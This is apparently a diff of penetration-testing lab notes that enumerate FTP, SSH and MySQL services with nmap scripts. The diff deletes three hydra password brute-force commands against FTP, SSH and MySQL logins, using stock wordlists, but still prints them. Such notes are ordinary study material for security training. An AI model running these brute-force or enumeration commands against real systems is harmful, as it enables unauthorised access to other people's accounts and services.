@@ -87,11 +87,8 @@ finger root@demo.xyz
 
 ls -la /usr/share/nmap/scripts | grep ftp-*
 
-# Using hydra brute-force.
-$hydra -L /usr/share/metasploit-framework/data/wordlists/users.txt -P /usr/share/metasploit-framework/data/wordlists/pass.txt target -t 4 ftp(protocol)
-
 # ftp target
-and we have anonymous login
+anonymous login
 
 $nmap target -p21 --script ftp-anon
 ```
@@ -106,8 +103,6 @@ $nmap target -p22 --script ssh-auth-methods
 --script-args="ssh.user=student"
 
 #attack
-
-$hydra -l student -P /usr/rockyou.txt target ssh(protocol)
 
 # How many “encryption_algorithms”?
 nmap --script ssh2-enum-algos 192.201.39.3
@@ -146,9 +141,6 @@ $nmap target -sCV -p3306 --script=mysql-variables --script-args="mysqluser='root
 
 $nmap target -sCV -p3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='', mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
 
-#attack
-
-$hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target mysql(protocol)
 
 #WINDOWS
 
